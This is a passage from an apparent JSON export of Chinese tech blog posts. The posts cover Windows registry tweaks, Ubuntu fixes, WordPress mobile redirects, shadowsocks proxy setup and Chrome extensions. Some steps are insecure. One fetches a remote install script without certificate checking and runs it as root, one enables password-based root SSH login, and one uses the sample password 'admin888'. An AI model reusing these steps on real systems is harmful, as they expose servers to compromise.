最后,我直接整理了个删除的注册表,不想找的保存成reg文件,管理员账号导入就可以了,如果需要保留的,就从注册表中删除掉. 1234567891011Windows Registry Editor Version 5.00#音乐[-HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\&#123;1CF1260C-4DD0-4ebb-811F-33C572699FDE&#125;]#下载[-HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\&#123;374DE290-123F-4565-9164-39C4925E467B&#125;]#图片[-HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\&#123;3ADD1653-EB32-4cb0-BBD7-DFA0ABB5ACCA&#125;]#视频[-HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\&#123;A0953C92-50DC-43bf-BE83-3742FED03C9C&#125;]#文档[-HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\&#123;A8CDFF1C-4878-43be-B5FD-F8091C1C60D0&#125;] 注册表路径前面的-表示将此注册表项删除,请根据自己的需求自行增减即可. 如果不想删除注册表,那也可以将文件夹排列方式和分组依据改成以类型和递减方式,就可以把碍事的文件夹排到窗口底部了. 参考文档:http://jingyan.baidu.com/article/eae07827f594d21fec548515.html","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"Ubuntu-chromium地址栏不显示中文及标题栏中文显示乱码问题","slug":"chromium-display-chinese-in-ubuntu","date":"2014-07-17T08:26:22.000Z","updated":"2024-09-28T00:17:21.254Z","comments":true,"path":"chromium-display-chinese-in-ubuntu.html","permalink":"https://sobaigu.com/chromium-display-chinese-in-ubuntu.html","excerpt":"","text":"新升级了chromium,结果发现在地址栏输入中文不显示,但回车可以搜索正确的中文,标题栏中的中文也显示为乱码,链接栏中链接也乱七八糟的… 很显然,这些都是字体问题,也不知道自己改了啥,突然就这样了,懒得回忆做了什么,直接把系统默认字体更改下. 安装文泉驿字体 1234567#查下文泉驿的安装包名称zzz@Expired:~$ apt-cache search wenquanyifonts-wqy-microhei - Sans-serif style CJK font derived from Droidfonts-wqy-zenhei - “WenQuanYi Zen Hei” A Hei-Ti Style (sans-serif) Chinese fontxfonts-wqy - WenQuanYi Bitmap Song CJK font for X#可见有三个文泉驿的字体包,我们索性都安装了吧zzz@Expired:~$ sudo apt-get install fonts-wqy-zenhei fonts-wqy-microhei xfonts-wqy -y 修改系统字体配置 12#只需要改这一个配置文件就可以了zzz@Expired:~$ sudo gedit /etc/fonts/conf.d/49-sansserif.conf 将倒数第4行改成文泉驿字体,最终更改完成后如下内容: 123456789101112131415161718192021&lt;?xml version=”1.0”?&gt;&lt;!DOCTYPE fontconfig SYSTEM “fonts.dtd”&gt;&lt;fontconfig&gt;&lt;!–If the font still has no generic name, add sans-serif–&gt;&lt;match target=”pattern”&gt;&lt;test qual=”all” name=”family” compare=”not_eq”&gt;&lt;string&gt;sans-serif&lt;/string&gt;&lt;/test&gt;&lt;test qual=”all” name=”family” compare=”not_eq”&gt;&lt;string&gt;serif&lt;/string&gt;&lt;/test&gt;&lt;test qual=”all” name=”family” compare=”not_eq”&gt;&lt;string&gt;monospace&lt;/string&gt;&lt;/test&gt;&lt;edit name=”family” mode=”append_last”&gt;&lt;string&gt;WenQuanYi Zen Hei&lt;/string&gt;&lt;/edit&gt;&lt;/match&gt;&lt;/fontconfig&gt; 保存后,甚至不需要你重启chromium,标题栏和链接栏,地址栏就能正常显示中文了.至此,Ubuntu下chromium地址栏不显示中文,chromium标题栏中文显示乱码及链接栏显示乱码问题顺利解决.","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"},{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"个人博客-移动主题-在360网站卫士缓存全开情况下的切换","slug":"mobile-view-with-360","date":"2014-07-12T06:12:54.000Z","updated":"2024-09-28T00:17:21.254Z","comments":true,"path":"mobile-view-with-360.html","permalink":"https://sobaigu.com/mobile-view-with-360.html","excerpt":"","text":"360网站卫士缓存全开之后的优劣分析： 缓存全开有什么好处? ①、速度达到飞一般的感觉； ②、节约空间大量流量，因为访问调用的是360CDN缓存镜像 ③、可抛弃本地相关插件：比如wp-super-cache等缓存插件、七牛CDN插件等 缓存全开之后，会有什么弊端： ①、主题切换失效（仅针对非响应式主题）；→本文重点解决对象 ②、前台登录功能失效（可使用wp-admin路径登录）； ③、原生评论可能会出问题（用多说就没影响）； ④、补充：移动端无法切换到电脑版（此问题已解决，详见及相关文章=&gt;） ⑤、补充：浏览计数无法排除已登录用户的访问，如wp-postviews； ⑥、其他张戈可能尚未发现的问题，欢迎反馈！ 方法由来： 当张戈把主题调度插件：**Any Mobile Theme Switcher **卸载之后，想起了百度的移动建站siteapp，于是前往http://siteapp.baidu.com 开始尝试siteapp制作移动站，在提交审核之后，在域名部署里面发现了新大陆： 终于让我找到了JS判断UA并切换主题的方法（之前找到方法的好像用的都不太顺…）！ 只要将百度提供的切换代码根据实际情况修改了下，再结合另一款支持二级域名的主题调度插件，终于完美实现了JS切换移动主题！ 终于，非响应式网站也可以酣畅淋漓地使用360网站卫士的全部缓存功能了！同时，也绝对兼容任何本地静态缓存插件，比如完全静态缓存插件cos-cache-html、偶尔主题切换抽风的wp-super-cache和Hpyer Cache等！ 实现方法： 一、新增移动站二级域名 如何新增二级域名，请自查方法，张戈在此仅提供DA面板的设置方法： ①、打开你的DA控制面板，找到如下高级设置，并选择域名额外绑定（DA版本不一样，可能位置有所区别）： ②、点击打开“域名额外绑定”，如下图增加自定义二级域名，作为移动访问站点： ③、前往域名DNS管理那给二级域名新增A记录： Ps：利用此方法制作移动站，仅需要一个插件和一个二级域名足矣，而不需要另外一份网站文件，强烈推荐！ 接下来，在坐等二级域名生效的同时，咱们继续往下操作。 二、安装WordPress Mobile Pack ①、首先请安装支持二级域名的主题调度插件：WordPress Mobile Pack。 可以后台搜索安装英文原版，或者下载张戈DIY之后的汉化精简版： 下载地址 Ps：张戈将插件汉化之后，又精简了大部分功能，比如：删除了插件自带的4款移动主题、访问统计以及侧边栏等功能（具体请自行对比），仅剩下了主题切换功能，不喜勿下~~~ ②、插件设置 请如下图设置插件：（若还没有手机主题，请先准备一套手机主题，找不到的可以参考张戈博客相关文章） 三、添加UA判断JS代码 因为是静态缓存，所以只有JS判断才能在静态页面下继续工作！下面继续~ ①、在function.php中新增函数，用于生成当前页面的链接： 编辑function.php，找个位置新增以下代码（怕放错就直接放到最后一个** ?&gt;** 的前面）： > > > function curMobURL() { > > /* 获取当前页面地址 */ > > $current_url = home_url(add_query_arg(array())); > > /* 将地址中的http:// 替换为http://m. */ > > $target_url = str_replace(\"http://\",\"http://m.\",\"$current_url\"); > > /* 过滤一些留言和分页页面 */ > > if (is_single()) { > > $target_url = preg_replace('/(\\/comment|page|#).*$/','',$target_url); > > } else { > > $target_url = preg_replace('/(comment|page|#).*$/','',$target_url); > > } > > echo $target_url; > > } > > ②、编辑主题头部模板：header.php，在后面加上如下代码： > > > > > > > (function(Switch){ > > var switch_pc = window.location.hash; > > if(switch_pc != \"#pc\"){ > > if(/iphone|ipod|ipad|ipad|Android|nokia|blackberry|webos|webos|webmate|bada|lg|ucweb|skyfire|sony|ericsson|mot|samsung|sgh|lg|philips|panasonic|alcatel|lenovo|cldc|midp|wap|mobile/i.test(navigator.userAgent.toLowerCase())){ > > Switch.location.href=''; > > } > > } > > })(window); > > > > 做完这些操作之后，现在你可以试试效果了： 先清除所有静态缓存和手机浏览器缓存，然后用手机访问网站，比如http://zhangge.net，观察是否会跳转到http://m.zhangge.net，并且展示的是移动样式！ 四、添加手动切换功能 切换正常后，你还可以依葫芦画瓢，在移动主题的footer.php加上手动切换链接，详见张戈博客底部！ 具体做法：将以下代码添加到移动版主题目录下的footer.php相应位置即可。 > > > /* 下面的curlPcURL函数也可以添加到移动主题的functions.php中（但是切记不要重复添加！） */ > > function curPcURL() { > > /* 获取当前页面地址 */ > > $current_url = home_url(add_query_arg(array())); > > /* 将地址中的http://m.替换为http:// */ > > $target_url = str_replace(\"http://m.\",\"http://\",\"$current_url\"); > > /* 过滤一些留言和分页页面 */ > > if (is_single()) { > > $target_url = preg_replace('/(\\/comment|page|#).*$/','',$target_url); > > } else { > > $target_url = preg_replace('/(comment|page|#).*$/','',$target_url); > > } > > echo $target_url; > > } > > ?> > > > > 电脑版 > > Ps：电脑版切换到移动版，以及PC端用户访问移动版自动跳到电脑版的方法，请自行依葫芦画瓢添加代码，张戈就不赘述了**（实在不懂的可以参考张戈博客的PC和移动页面的源代码）。** 全部完成之后，你就可以开启360网站卫士的全部静态缓存功能了： Ps：记得移动二级域名同样设置下整站缓存，移动端开启速度快到无法想象！ 而且可以发现，上图的三项缓存功能并没有缓存到单页面和分类页面，于是你可以下拉，如下图添加强行缓存地址： 设置后，一分钟左右就会生效！用手机访问将直接跳至移动站，完美实现了在静态缓存的情况下的站点切换！ 另外，非响应式网站使用【**本地静态缓存插件】**也不再纠结偶尔PC机访问网站出现手机页面的尴尬事儿！ 这就是JS判断UA的天然优势！静态页面下依然坚挺有效！ 本文方法理论上同样适用于其他支持整站静态缓存的CDN，比如百度加速乐，有兴趣的朋友可以试试看！ 本文部分代码和插件仅支持WordPress，其他建站程序请参考解决思路，自行折腾吧~","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"https://sobaigu.com/tags/WordPress/"}]},{"title":"Ubuntu环境-使用root账号ssh登陆","slug":"ssh-login-ubuntu-with-root","date":"2014-06-11T10:29:54.000Z","updated":"2024-09-28T00:17:21.254Z","comments":true,"path":"ssh-login-ubuntu-with-root.html","permalink":"https://sobaigu.com/ssh-login-ubuntu-with-root.html","excerpt":"","text":"Ubuntu14.04使用有一段时间了,今天图方便,想在工作机上使用SecureCRT远程登陆笔记本. 要ssh远程,首先需要安装ssh服务: 1xxx@ThinkPad-X100e:~$sudo apt-get install ssh 然后启用root账号,给root账号设置密码: 1xxx@ThinkPad-X100e:~$sudo passwd root ssh等一般默认就设置就可以了,如果需要个性化端口等设置,google一把设置方法.安装完重启系统或者使用命令启动ssh服务: 1xxx@ThinkPad-X100e:~$sudo service ssh start 接下来使用secureCRT登陆,居然提示认证失败,各种设置密码,还是同样提示.google一把说Ubuntu14.04默认做了限制,需要修改/etc/ssh/sshd_config这个文件. /etc/ssh/sshd_config原始内容如下: 123456789101112131415161718192021222324252627282930313233343536373839404142Package generated configuration fileSee the sshd_config(5) manpage for details# What ports, IPs and protocols we listen forPort 22Use these options to restrict which interfaces/protocols sshd will bind to#ListenAddress ::#ListenAddress 0.0.0.0Protocol 2HostKeys for protocol version 2HostKey /etc/ssh/ssh_host_rsa_keyHostKey /etc/ssh/ssh_host_dsa_keyHostKey /etc/ssh/ssh_host_ecdsa_keyHostKey /etc/ssh/ssh_host_ed25519_key#Privilege Separation is turned on for securityUsePrivilegeSeparation yes# Lifetime and size of ephemeral version 1 server keyKeyRegenerationInterval 3600ServerKeyBits 1024# LoggingSyslogFacility AUTHLogLevel INFO# Authentication:LoginGraceTime 120PermitRootLogin without-passwordStrictModes yesRSAAuthentication yesPubkeyAuthentication yes#AuthorizedKeysFile %h/.ssh/authorized_keys# Don’t read the user’s ~/.rhosts and ~/.shosts filesIgnoreRhosts yesFor this to work you will also need host keys in /etc/ssh_known_hostsRhostsRSAAuthentication nosimilar for protocol version 2HostbasedAuthentication noUncomment if you don’t trust ~/.ssh/known_hosts for RhostsRSAAuthentication#IgnoreUserKnownHosts yes 将以上登陆验证部分内容修改为: 1234567# Authentication:LoginGraceTime 120#将PermitRootLogin without-password注销掉,不允许无密码登陆#PermitRootLogin without-password#PermitRootLogin yes,允许root登陆,默认是没有的,我们加上这行PermitRootLogin yesStrictModes yes 保存退出,再次重启sshd服务,登陆ok.","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"},{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"CentOS_Debian-搭建shadowsocks-libev服务端","slug":"centos-debian-shadowsocks-libev-server","date":"2014-06-07T02:29:13.000Z","updated":"2024-09-28T00:17:21.254Z","comments":true,"path":"centos-debian-shadowsocks-libev-server.html","permalink":"https://sobaigu.com/centos-debian-shadowsocks-libev-server.html","excerpt":"","text":"shadowsocks是近两年才发展起来的轻量级的socks5代理软件，相较于传统的ssh，shadowsocks速度更快,shadowsocks-libev是shadowsocks众多版本中的一种,相对于其他版本的shadowsocks，shadowsocks-libev不会出现掉进程或cpu 100%的问题。 安装必要组建 centos执行 1yum install build-essential autoconf libtool openssl-devel gcc -y debian执行 1apt-get install build-essential autoconf libtool libssl-dev gcc -y 安装git centos执行 1yum install git -y debian执行 1apt-get install git -y 装完了执行 git --version ，如果出版本号则安装成功。 下载shadowsocks-libev源码包并编译 1234git clone https:&lt;span class=&quot;comment&quot;&gt;//github.com/madeye/shadowsocks-libev.git &lt;/span&gt;cd shadowsocks-libev./configuremake &amp;amp;&amp;amp; make install 运行shadowsocks 1nohup /usr/local/bin/ss-server -s IP地址 -p 端口 -k 密码 -m 加密方式 &amp;amp; 比如：nohup /usr/local/bin/ss-server -s 156.132.67.213 -p 8981 -k admin888 -m aes-256-cfb &amp;amp; 加入开机启动 1echo &quot;nohup /usr/local/bin/ss-server -s IP地址 -p 端口 -k 密码 -m 加密方式 &amp;amp;&quot; &gt;&gt;/etc/rc.local 关于客户端 shadowsocks的客户端现在已经不少了，可以到此下载:http://sourceforge.net/projects/shadowsocksgui/files/dist/ 安卓、IOS也有客户端，自行app商店中搜索shadowsocks或影梭下载。 关于加密方式 如果启动命令里不写“-m aes-256-cfb”的话，则默认的加密方式为table，选择aes-256-cfb则比较安全。 关于更改端口、密码、加密方式 启动命令里已经包含了这些信息，如果改了，别忘记也改一下开机启动里的。如果需要多端口多密码,可以选择go版或nodejs版本. 关于结束服务 ps aus 会看到“/usr/local/bin/ss-server …….”的进程，kill掉即可. 参考文档:http://www.lucong.com.cn/lulu/centos-debian-shadowsocks-libev.html","categories":[{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"CentOS环境-shadowsocks-libev_一键安装脚本","slug":"shadowsocks-libev-onekey-install","date":"2014-05-27T01:12:42.000Z","updated":"2024-09-28T00:17:21.254Z","comments":true,"path":"shadowsocks-libev-onekey-install.html","permalink":"https://sobaigu.com/shadowsocks-libev-onekey-install.html","excerpt":"最近换了个vps,也顺道把原先一直在用的的pptpd换成了shadowsocks,虽然要装个客户端,但配合switchsharp用,真的是很爽.方法都是通用的,转载一篇别人整理好的shadowsocks一键安装脚本,安装很方便.","text":"最近换了个vps,也顺道把原先一直在用的的pptpd换成了shadowsocks,虽然要装个客户端,但配合switchsharp用,真的是很爽.方法都是通用的,转载一篇别人整理好的shadowsocks一键安装脚本,安装很方便. 本脚本适用环境 系统支持：CentOS/Redhat/Fedora 内存要求：≥128M 关于本脚本 一键安装 libev 版的 shadowsocks 最新版本。该版本的特点是内存占用小（600k左右），低 CPU 消耗，甚至可以安装在基于 OpenWRT 的路由器上。 默认配置 服务器端口：8989 客户端端口：1080 密码：自己设定（如不设定，默认为teddysun.com） 客户端下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 hn5i 使用方法 使用root用户登录，运行以下命令： 123wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-libev.shchmod +x shadowsocks-libev.sh./shadowsocks-libev.sh 2&gt;&amp;amp;1 | tee shadowsocks-libev.log 安装完成后，脚本提示如下： Congratulations, shadowsocks-libev install completed! Your Server IP:（你的服务器IP） Your Server Port:8989 Your Password:（你设定的密码） Your Proxy Port:1080 Welcome to visit:http://teddysun.com/357.html Enjoy it! 卸载方法 使用 root 用户登录，运行以下命令： 1./shadowsocks-libev.sh uninstall 其他事项 客户端配置的参考链接：http://teddysun.com/339.html 安装完成后即已后台启动 shadowsocks ，运行： 1ps -ef | grep ss-server | grep -v ps | grep -v grep 可以查看进程是否存在。 本脚本安装完成后，会将 shadowsocks-libev 加入开机自启动。 使用命令 启动：/etc/init.d/shadowsocks start 停止：/etc/init.d/shadowsocks stop 重启：/etc/init.d/shadowsocks restart 查看状态：/etc/init.d/shadowsocks status 特别说明 已安装旧版本的 shadowsocks 需要升级的话，需下载本脚本的最新版，运行卸载命令./shadowsocks-libev.sh uninstall后，再次执行本脚本即可安装最新版。 关于 CentOS 的默认iptables防火墙规则icmp-host-prohibited，如果安装之后发现已经启动 shadowsocks，本地客户端却不能连接上，请检查iptables是不是有如下的一条规则： 1REJECT all -- 0.0.0.0/0 0.0.0.0/0 reject-with icmp-host-prohibited 运行命令： /etc/init.d/iptables status 可以查看。如果有这条规则，则添加的 8989 端口需手动更改一下，放到这条规则的上一行。编辑 /etc/sysconfig/iptables文件，将： -A INPUT -p tcp -m state --state NEW -m tcp --dport 8989 -j ACCEPT 放在： -A INPUT -j REJECT --reject-with icmp-host-prohibited 的前面。最终效果如下： -A INPUT -p tcp -m state --state NEW -m tcp --dport 8989 -j ACCEPT -A INPUT -j REJECT --reject-with icmp-host-prohibited 编辑完后，重启iptables 防火墙。命令：/etc/init.d/iptables restart git链接：https://github.com/madeye/shadowsocks-libev","categories":[{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"shadowsocks","slug":"shadowsocks","permalink":"https://sobaigu.com/tags/shadowsocks/"}]},{"title":"网站管理-安全防护-网站加速必备","slug":"dnspod-jiasule-360","date":"2014-05-05T09:21:29.000Z","updated":"2024-09-28T00:17:21.254Z","comments":true,"path":"dnspod-jiasule-360.html","permalink":"https://sobaigu.com/dnspod-jiasule-360.html","excerpt":"","text":"捣鼓自己的博客这么些年,空间换了n个,目前买了个vps,平常就放俩下博客,搭个vpn翻翻墙啥的.毕竟咱不专业,有时候网站莫名其妙流量异常,或者访问慢等. 做网站受了攻击无能为力,这时候我们就需要借助一些免费或收费的资源,达到网站管理方便,安全防护到位及免费网站加速的效果. DNSPOD 国内最大的域名解析服务提供商,针对普通用户免费使用,在域名注册商处将DNS服务器指向dnspod后,可以登陆dnspod网站方便地管理各种域名解析,解析速度也较快.而且可以解决墙外注册的域名被GFW的问题.本博就一直用的dnspod的服务. DNSPOD还提供异常通知服务,通过微信及邮件,可以及时知道站点的运行情况.dnspod的使用也很简单,各种教程官方帮助文档里都有,就不浪费资源粘贴了. 加速乐 加速乐已经被百度收编,连原官网域名都直接跳转到百度的子域名. 免费用户提供每天30万pv的加速缓存服务,对一般站点而言这些都足够了.如果你的域名没有在天朝备案,将无法看到各种数据报表,而且只能用NS方式接入,也就不能使用上面那个方便的dnspod管理了. 设置了加速乐接入后,你的网站就加入CDN队列了,各地访问的ip都不一样.如果网站服务器短暂当机,也不至于造成网站无法访问. 360网站卫士 360网站卫士当前用的人应该不多,跟360站长联盟一样出来不久,功能也比较基础.由于还处于起步阶段,目前来看使用限制还不多.废话不多说,有兴趣的可以去尝尝鲜.","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[]},{"title":"Ubuntu_14.04-64位环境-安装flash播放插件-截图软件","slug":"ubuntu-14-04-flash-plugin-for-chromium","date":"2014-04-30T15:23:42.000Z","updated":"2024-09-28T00:17:21.254Z","comments":true,"path":"ubuntu-14-04-flash-plugin-for-chromium.html","permalink":"https://sobaigu.com/ubuntu-14-04-flash-plugin-for-chromium.html","excerpt":"","text":"新安装了Ubuntu14.04,界面更炫了.之前安装好了输入法,之后当然要把shutter,chrome之类的必装软件安装好了. shutter是Ubuntu下一个特别好使的截图软件,可以劫持窗口,选定区域,还可以对下拉菜单进行截图,比系统自带的printscreen自然是优秀不是一点两点,如果你玩Ubuntu,那么你就值得拥有. Chrome在Linux下版本叫本名chromium,具体怎么样就自不必说了,优秀的扩展实现你想实现的功能,本博客推荐过一些必备的扩展:Chrome必装扩展,你所安装的扩展,会自动同步到google账号,换另外的机器登陆即自动同步,甚至有些设置都能一并搬过去. 默认chrome是内置flash插件的,你可以在chrome的地址栏输入 看有没有安装或查看flash插件的状态. 在之前的chrome版本中,共用firefox的flash插件,Linux自带的firefox也需要额外安装flash插件,到这下载flash插件的so文件:http://get.adobe.com/flashplayer/?no_redirect,安装方法见64位Ubuntu安装flash控件. 但之后的Ubuntu14.04中,Chromium版本就没那么简单了,在Chromium Version 34版本中,需要借助pepperflashplugin-nonfree这么个组件包,chromium安装flash插件稍费周折. 首先我们随便找个视频网站,如优酷,随便点个视频,此时提示要安装flash插件才可以正常播放,我们按引导点击获取flash插件的链接,链接里也包含安装的方法,安装方法就是下面两步: step1.安装pepperflashplugin-nonfree 按super键,一般也就是Windows徽标键,打开软件查找界面,打开Ubuntu软件中心,我们搜索pepperflashplugin-nonfree,点击install先安装好. step2.通过pepperflashplugin自动安装flash 安装完成,重启chromium,此时应该大功告成了,找视频播放去吧.英文帮助可以参见:https://wiki.Ubuntu.com/Chromium/Getting-Flash#help","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"}]},{"title":"Ubuntu无法打开win8分区-解决办法","slug":"ubuntu-mount-partion-for-win8","date":"2014-04-26T16:08:16.000Z","updated":"2024-09-28T00:17:21.254Z","comments":true,"path":"ubuntu-mount-partion-for-win8.html","permalink":"https://sobaigu.com/ubuntu-mount-partion-for-win8.html","excerpt":"","text":"机器安装的双系统,Windows8.1和Ubuntu14.04,进Ubuntu后,访问Windows分区时没反应,用Ubuntu文件管理器访问时,报出错误提示. 错误显示mount ntfs分区时失败,错误中写了错误原因如下: The disk contains an unclean file system (0, 0). Metadata kept in Windows cache, refused to mount. 大致意思是这个磁盘包含一个未清理的系统文件,元数据保存在Windows缓存中,拒绝加载.我们都知道Windows8中加快了系统的启动速度,据说奥妙就在于Windows将一些非启动数据放到了缓存文件,如页面文件,休眠文件等.再次启动时,系统无需再次去读取其他文件,以此达到加快系统启动的目的.可能是为了保证这部分数据不被破坏,对这部分数据做了标记,拒绝其他系统进行加载.这些都是google告诉我的,暂且一信. 解决办法就是关闭Windows的休眠功能. 进入Windows系统,呼出开始菜单,查找cmd,在cmd黑框上右键&gt;以管理员身份运行输入以下命令: 1powercfg /h off 此时就把Windows8系统的休眠功能关闭了,再进Ubuntu系统,能正常访问ntfs分区了.至于关闭这个休眠功能后,是否影响Windows系统开机启动速度,自个儿去体会吧. 参考文档:Ubuntu 13.04 is unable to mount a disk drive from ex-windows system","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"},{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"Ubuntu14.04_ibus_中文输入法_unable to resolve host","slug":"ubuntu14-04-ibus-unable-to-resolve-host","date":"2014-04-25T10:05:56.000Z","updated":"2024-09-28T00:17:21.254Z","comments":true,"path":"ubuntu14-04-ibus-unable-to-resolve-host.html","permalink":"https://sobaigu.com/ubuntu14-04-ibus-unable-to-resolve-host.html","excerpt":"","text":"在万众期待中发布了,迫不及待地把用了2年的12.04全盘格了,换上了传说中的准云操作系统Ubuntu14.04.安装没有啥好说的,这次是和win8.1双系统. 安装完后,依老习惯设置中文输入法,就用系统默认的ibus吧.因为安装的时候选择的英文环境,所以系统默认是没有安装中文支持的,在终端使用以下命令安装,或者打开language support,系统应该默认会提示让你安装,点击安装就可以了. 安装完成后,此时添加中文拼音(chinese-pinyin)输入法,结果你会发现ibus拼音非拼音,结果如下情形. 遇到了别慌张,其实还是缺少中文支持的问题,把系统重启下再用,应该就正常了. 这个版本的介绍中,特意强调了一个叫麒麟的版本,Ubuntu集成了搜狗输入法,搜狗输入法官方也特意开了个页面来推广Linux版本的搜狗输入法.试用了下,貌似是以前的小企鹅输入法,毕竟搜狗输入法的底子在那,还算可以吧,总之没Windows下设置方便.一样的,安装完成后记得注销或者重启下系统,否则也一样的莫名其妙的无法启用. 坑爹的是,搜狗官方帮助里,并不提供安装后怎么添加,怎么设置搜狗输入法的使用说明.如果不想折腾,那还是用系统默认的ibus吧. 安装完成时,可能中途改了计算机名称老是报&quot;unable to resolve host…&quot;错误,打开hosts看了下,原来没有同步过来. 一些命令都需要解析主机回环,把hosts中的主机名改成和/etc/hostname中一致就可以了.","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"}]},{"title":"Chrome必装扩展","slug":"chrome-extensions","date":"2014-04-20T13:48:40.000Z","updated":"2024-09-28T00:17:21.254Z","comments":true,"path":"chrome-extensions.html","permalink":"https://sobaigu.com/chrome-extensions.html","excerpt":"","text":"Chrome从诞生那天起，就注定是个了不起的浏览器，以自身及其Chromium开源出来的多如牛毛的山寨版本，以迅雷不及掩耳之势打破了微软捆绑IE的围堵，也借此革了火狐的命。 由于使用习惯及功能相似，加上特有的简洁性，google血统，有一大波火狐用户转为chrome用户，我就是其中之一。不进则退的规则在互联网领域表现得淋漓尽致。 既然chrome和火狐一样，那不得不提其扩展了，各种扩展满足了人们的各种需求功能，以下本博主认为是chrome必备扩展。 广告屏蔽 1.1 AdBlock or AdBlock plus 在FireFox上大名鼎鼎的扩展，在chrome时代当然也如此，互联网时代，参与者都想流量变现，导致广告满天飞，装上AdBlock plus，从此与大多数广告说byebye。 1.2 Adkill 这是个可以屏蔽视频广告的扩展，优酷土豆啥的恨死它了，所以很多时候视频网站总是变着法展现广告，有时候会专门自杀播放出错,针对的主就是它了。 1.3 FlashBlock 顾名思义，这是屏蔽flash的东西，flash广告等需要用户点击后才播放，不会一堆flash导致浏览器资源占用上升（当然，本身这个扩展启用也是在占用资源，这不是为了清净么）。可以设置不运行的网站白名单。 办公管理 2.1 Checker Plus for Gmail 2.2 Checker Plus for Google Calendar™ 以上两个是用来收发gmail邮件的，可以不登录gmail页面的情况下对邮件进行阅读，回复等管理。 2.3 Docs PDF/PowerPoint Viewer (by Google) 在线用浏览器可以打开doc，ppt及pdf文档，而不是作为附件下载。 2.4 Axure RP Extension for Chrome 大名鼎鼎的原型设计工具Axure的扩展，一般安装Axure 后会自动添加，要不然也会在打开Axure 文件的时候提示安装。 辅助操作 3.1 Yet Another Drag and Go 很好用的拖拽搜索功能，可以自定义左右上下鼠标拖拽用什么搜索引擎进行搜索。比如设置向右使用google搜索，选中要搜索的文字，向右拖拽，松开鼠标就可以了，非常方便。 3.2 TabJump - Intelligent Tab Navigator 记录最近访问的标签，有时候想打开之前的某一页面，点击就自动罗列出来了。 3.3 Mouse Stroke 鼠标手势扩展,通过鼠标左右键操作可以实现浏览器标签操作,搜索等功能. 链接转换 4.1 Thunder,QQDownload Files Downloader 破解迅雷，qq旋风和快车的专用链，不用安装对应的软件可以用浏览器下载迅雷专用链接等资源了。 4.2 Short Link Getter 4.3 Context Menu URL Shortener 傻乎乎的将链接在微博发一遍，然后拷贝，就为了一个短链接，累不累？直接用以上两个之一就可以了，推荐用“Context Menu URL Shortener”，可以设置用哪个网站生成短链接，在需要转换的页面内右键&gt;copy short url就搞定了。 4.4 Proxy SwitchySharp 代理切换工具，配合代理工具或ip，实现按需自动切换代理，简单方便，见[晒酷软]活在天朝必备技能:翻过万里长城 4.5 Image Properties Context Menu 我们都知道chrome不能像微软IE那样，直接图片上可以右键属性查看图片信息，有时候需要，安装此扩展就可以查看到图片的属性信息了，而且还提供原始图片，指向链接，图片缩放等功能。 4.6 Skip Redirector 经常下载墙外资源的用的到，很多网盘为了收益都会在下载链接显示前播放很长的广告，时间不到不显示。此扩展将加速广告播放时间，让你瞬间看到最终的下载链接。 4.7 User-Agent Switcher 模拟浏览器核心的扩展。用此扩展，我们可以模拟是手机浏览器，水果浏览器等。 4.8 智能代理 智能代理插件 autoProxy ，网络自动更新代理，智能查找最快的代理服务器。也可以添加自己的代理服务器,但可惜不能实现类似Proxy SwitchySharp的按需自动切换到代理功能. 4.9 Tampermonkey 